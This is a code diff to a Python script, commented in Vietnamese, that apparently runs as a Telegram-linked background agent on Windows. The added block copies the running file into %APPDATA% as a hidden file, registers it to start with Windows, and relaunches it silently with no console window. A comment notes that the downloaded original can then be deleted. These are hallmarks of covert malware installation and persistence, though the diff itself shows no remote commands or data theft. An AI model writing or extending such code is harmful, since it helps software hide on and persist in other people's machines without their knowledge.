@@ -1454,6 +1454,16 @@ def acquire_single_instance():
         return True
 
 
+def release_single_instance():
+    global MUTEX_HANDLE
+    try:
+        if MUTEX_HANDLE and IS_WINDOWS:
+            ctypes.windll.kernel32.CloseHandle(MUTEX_HANDLE)
+    except Exception:
+        pass
+    MUTEX_HANDLE = None
+
+
 def hide_console():
     if not IS_WINDOWS:
         return
@@ -1556,6 +1566,26 @@ def main():
             log("Canh bao: khong ket noi duoc Telegram luc khoi dong (se thu lai).")
     except Exception as e:
         log("getMe check error: %s" % e)
+
+    # === INSTALL & HAND-OFF (ban .pyw) ===
+    # Neu dang chay tu file ngoai (vd: tai ve), cai ban chuan vao %APPDATA% roi
+    # chuyen sang chay ban do -> file tai ve co the xoa sau khi chay.
+    if not IS_FROZEN:
+        _cur = os.path.abspath(sys.argv[0]) if sys.argv and sys.argv[0] else ""
+        if _cur and os.path.abspath(_cur) != os.path.abspath(SELF_COPY):
+            if copy_hidden(_cur, SELF_COPY):
+                ensure_persistence()
+                release_single_instance()
+                try:
+                    pyw = find_pythonw()
+                    subprocess.Popen([pyw, SELF_COPY], cwd=BASE_DIR,
+                                     creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
+                                     close_fds=True)
+                    log("Da cai vao APPDATA va chuyen sang ban chuan.")
+                    return
+                except Exception as e:
+                    log("relaunch error: %s" % e)
+                    acquire_single_instance()
 
     # duy tri khoi dong cung Windows
     ensure_persistence()
